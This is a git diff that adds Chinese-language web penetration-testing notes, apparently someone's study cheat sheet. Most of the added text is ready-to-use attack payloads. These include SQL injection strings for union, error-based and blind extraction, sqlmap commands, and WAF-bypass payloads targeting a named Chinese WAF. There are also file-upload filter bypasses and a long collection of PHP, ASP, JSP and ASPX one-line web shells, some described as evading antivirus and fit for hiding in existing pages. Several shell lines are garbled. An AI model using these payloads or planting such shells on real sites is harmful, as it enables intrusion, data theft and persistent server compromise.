@@ -1,3 +1,44 @@
+<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->
+
+<!-- code_chunk_output -->
+
+  - [漏洞三大类](#漏洞三大类)
+    - [系统漏洞](#系统漏洞)
+    - [WEB漏洞](#web漏洞)
+    - [中间件漏洞](#中间件漏洞)
+- [信息收集](#信息收集)
+  - [CDN检测](#cdn检测)
+  - [网站](#网站)
+- [Web漏洞](#web漏洞-1)
+  - [sql注入漏洞](#sql注入漏洞)
+    - [mysql注入](#mysql注入)
+      - [union联合注入](#union联合注入)
+      - [报错注入](#报错注入)
+      - [布尔盲注](#布尔盲注)
+      - [时间盲注](#时间盲注)
+      - [sqlmap注入](#sqlmap注入)
+      - [post注入](#post注入)
+      - [cookie注入](#cookie注入)
+      - [HTTP头部注入](#http头部注入)
+      - [json注入](#json注入)
+      - [插入注入](#插入注入)
+      - [二次注入](#二次注入)
+      - [dnslog带外注入](#dnslog带外注入)
+      - [堆叠注入](#堆叠注入)
+      - [WAF绕过注入](#waf绕过注入)
+  - [XSS跨站](#xss跨站)
+  - [目录遍历漏洞](#目录遍历漏洞)
+  - [文件读取漏洞](#文件读取漏洞)
+  - [文件上传漏洞](#文件上传漏洞)
+    - [客户端](#客户端)
+    - [服务端](#服务端)
+    - [漏洞](#漏洞)
+    - [waf绕过](#waf绕过)
+    - [一句话木马大全](#一句话木马大全)
+  - [文件下载漏洞](#文件下载漏洞)
+
+<!-- /code_chunk_output -->
+
 
 
 
@@ -48,12 +89,289 @@ fofa，shodan，zoomeye
 
 ## Web漏洞
 
-### SQL注入漏洞
+### sql注入漏洞
+
+#### mysql注入
+MYSQL5.0 以上版本：自带的数据库名 information_schema
+information_schema：存储数据库下的数据库名及表名，列名信息的数据库
+information_schema.schemata：记录库名信息的表
+information_schema.tables：记录表名信息的表
+information_schema.columns：记录列名信息表
+获取相关数据：
+1、数据库版本-看是否符合 information_schema 查询-version()   -5.5.532
+2、数据库用户-看是否符合 ROOT 型注入攻击-user()       -root@localhost
+3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os-win
+4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()    -syguestbook
+
+load_file('route')  读取文件
+union select 1,'x',3 into outfile 'route' 写入文件
+
+**防注入**：
+1. 魔术引号（magic_quotes_gpc） //HEX编码或宽字节绕过
+2. 内置函数，int等
+3. 自定义关键字，select等
+4. WAF防护软件：安全狗，宝塔等
+
+
+##### union联合注入
+
+1.  **判断有无注入点**
+老方法：
+id=1 and 1=1 limit 0，1 正常
+id=1 and 1=2 limit 0，1 错误
+id=1 or 1=1 limit 0，1 正常
+id=1 or 1=2 limit 0，1 正常
+
+新方法：
+id=1alsdfjel 错误
+2. **判断字段数**
+order by
+3. **判断回显点**
+union select 1，2，3，4 //要先使原先的查询语句不显示，如id=1 and 1=2 limit 0，1
+4. **获取数据**
+    - ?id=-1' union select 1,2,database() --+ //数据库名
+    - ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ //所有数据库
+    - ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 
+    or
+    ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+ //指定数据库中表名
+    - ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='maoshe' and table_name='admin' --+ //指定数据库，表名的所有字段名
+    - ?id=-1' union select 1,2,group_concat(username,password) from users --+ //具体数据
+
+##### 报错注入
+前提：页面会显示数据库报错信息。
+得到报错信息、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。
+
+数据库名
+?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
+##### 布尔盲注
+情况：没有显示位、没有报错信息，但是有SQL语句执行错误信息输出的场景，仅仅通过报错这一行为去判断SQL注入语句是否执行成功。
+
+数据库长度
+?id=1' and (length(database()))>7 --+	
+?id=1' and (length(database()))>8 --+
+##### 时间盲注
+前提：页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。
+缺点：因为是通过sleep()函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。
+
+猜解数据库
+数据库个数
+?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)
+
+第一个数据库名有多少个字符
+?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)
+##### sqlmap注入
+基础探测命令
+联合查询注入：
+
+.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=U -v 3
+报错注入：
+
+.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=E -v 3
+布尔盲注：
+
+.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=B -v 3
+时间盲注：
+
+.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=T -v 3
+爆破数据
+--current-db 当前使用的数据库
+--dbs 列出数据库信息
+-D 指定数据库，爆破指定数据库中的表
+-D 数据库名 --tables
+-T 指定数据表名，爆破指定表中的字段
+-D 库名 -T 表名 --columns
+-C 指定字段名，爆破具体数据
+--dump 将数据导出、转储
+
+指定库、表、字段，查询具体数据
+.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=T -v 3 -D 
+
+##### post注入
+用 # 注释
+##### cookie注入
+##### HTTP头部注入
+##### json注入
+
+##### 插入注入
+##### 二次注入
+##### dnslog带外注入
+##### 堆叠注入
+http://ceye.io/
+https://github.com/ADOOO/DnslogSqlinj
+##### WAF绕过注入
+**数据**
+- 大小写
+- 加密解密
+- 编码解码
+- 等价函数
+- 特殊符号 mysql注释符号/**/
+- 反序列化
+- 注释符混用
+
+**方式**s
+- 更改提交方式
+- 变异
+
+**其他**
+- **Fuzz大法**:
+  https://zhuanlan.zhihu.com/p/344008210
+- 数据库特性
+- 垃圾数据溢出
+- **HTTP参数污染**：
+  构造请求包含多个相同参数名但具有不同参数值的参数。由于应用程序解析参数时可能存在解析顺序或解析方式的不一致性，攻击者可以利用这种不一致性来影响应用程序的行为。不同的解析方式可能导致应用程序选择了不同的参数值，从而导致意外的结果或绕过安全控制。
+- 白名单：
+  URL白名单，IP白名单，爬虫白名单，静态资源
+
+
+**example**
+- ```
+  database/**/()   '/**/' 为mysql注释符 绕过database()检测
+- ```
+  union #a
+  select 1,2,3#   'a'可以绕过安全狗的联合注入检测，再通过'#'使sql语句正常执行
+- ```
+  ?id=1/**&id=-1 union select 1,2,3#*/    /** */为mysql注释符，安全狗只检测到id=1，但由于参数污染，网站接受了id=-1 union select 1,2,3
+
+### XSS跨站
 
 ### 目录遍历漏洞
 
 ### 文件读取漏洞
 
 ### 文件上传漏洞
+
+![alt text](image.png)
+
+![alt text](image-1.png)
+#### 客户端
+- 本地禁用JavaScript（前端检测）
+- burp抓包（发送往服务器）
+- 复制前端代码，编辑后本地运行
+
+#### 服务端
+**黑名单**
+大小写，空格,点，::$$DARA，双后缀名绕过，特殊解析后缀，.htaccess解析，配合解析漏洞
+- **特殊解析后缀**：用.phtml .phps .php5 .pht进行绕过
+条件：在apache的httpd.conf中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht
+- **.htaccess解析**：创建一个.htaccess文件，里面写上<FilesMatch "4.png">
+SetHandler application/x-httpd-php
+这串代码的意思是如果文件中有一个4.png的文件，他就会被解析为.php
+条件：AllowOverride all且文件名字不被修改
+**白名单**
+MIME绕过，%00，0x00，0x0a截断
+- %00只能用于php版本低于5.3的
+**内容及其他**
+文件头检测，二次渲染，条件竞争，突破getimagesize，突破exif_imagetype
+- **条件竞争**：move_uploaded_file($temp_file,$upload_file)
+- move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.
+#### 漏洞
+**解析漏洞**
+IIS6/7.x，Apache，Nginx
+**CMS漏洞**
+某CMS上传1
+**其他漏洞**
+编辑器漏洞，CVE漏洞
+#### waf绕过
+数据溢出-防匹配(xxx...)
+符号变异-防匹配(' " ; )
+- filename="a.php
+
+数据截断-防匹配(%00 ; 换行)
+- filename="a.php%00.jpg"
+- filename="a.php;.jpg"
+
+重复数据-防匹配(参数多次)
+- filename="a.jpg"filename="a.jpg"filename="a.jpg"...filename="a.php"
+#### 一句话木马大全
+```
+##PHP：
+<?php @eval($_POST['r00ts']);?> 
+<?php phpinfo();?>
+<?php @eval($_POST[cmd]);?>
+<?php @eval($_REQUEST[cmd]);?>
+<?php assert($_REQUEST[cmd]); ?>
+<?php //?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); ?>
+<?php 
+//?cmd=phpinfo();
+$func =create_function('',$_REQUEST['cmd']);
+$func();
+?>
+
+<?php
+//?func=system&cmd=whoami
+$func=$_GET['func'];
+$cmd=$_GET['cmd'];
+$array[0]=$cmd;
+$new_array=array_map($func,$array);
+//print_r($new_array);
+?>
+
+<?php 
+//?cmd=phpinfo()
+@call_user_func(assert,$_GET['cmd']);
+?>
+
+<?php 
+//?cmd=phpinfo()
+$cmd=$_GET['cmd'];
+$array[0]=$cmd;
+call_user_func_array("assert",$array);
+?>
+
+<?php 
+//?func=system&cmd=whoami
+$cmd=$_GET['cmd'];
+$array1=array($cmd);
+$func =$_GET['func'];
+array_filter($array1,$func);
+?>
+
+<?php usort($_GET,'asse'.'rt');?> php环境>=<5.6才能用
+<?php usort(...$_GET);?>  php环境>=5.6才能用
+<?php eval($_POST1);?> 
+<?php if(isset($_POST['c'])){eval($_POST['c']);}?> 
+<?php system($_REQUEST1);?> 
+<?php ($_=@$_GET1).@$_($_POST1)?> 
+<?php eval_r($_POST1)?> 
+<?php @eval_r($_POST1)?>//容错代码 
+<?php assert($_POST1);?>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
+<?$_POST['c']($_POST['cc']);?> 
+<?$_POST['c']($_POST['cc'],$_POST['cc'])?> 
+<?php @preg_replace("/[email]/e",$_POST['h'],"error");?>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<O>h=@eval_r($_POST1);</O> 
+<?php echo `$_GET['r']` ?> 
+
+<script language="php">@eval_r($_POST[sb])</script> //绕过<?限制的一句话
+
+<?php (])?>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！
+
+<?if(isset($_POST['1'])){eval($_POST['1']);}?><?php system ($_REQUEST[1]);?> 
+加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！
+
+<%execute request(“class”)%><%'<% loop <%:%><%'<% loop <%:%><%execute request (“class”)%><%execute request(“class”)'<% loop <%:%> 
+无防下载表，有防下载表可尝试插入以下语句突破的一句话 
+
+<%eval(request(“1″)):response.end%> 备份专用
+
+##JSP：
+<%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%> 
+提交客户端 
+<form action="" method="post"><textareaname="t"></textarea><br/><input type="submit"value="提交"></form>
+
+##ASP
+<%eval(Request.Item["r00ts"],”unsafe”);%>
+
+<%IfRequest(“1″)<>”"ThenExecuteGlobal(Request(“1″))%> 
+
+<%execute(request(“1″))%> 
+
+<scriptrunat=server>execute request(“1″)</script> 不用'<,>‘的asp一句话 
+
+##aspx
+<scriptrunat=”server”>WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);</script> 
+
+<script language="C#"runat="server">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")</script> 
+
+<%eval request(chr(35))%>  不用双引号的一句话。
+```
 
 ### 文件下载漏洞
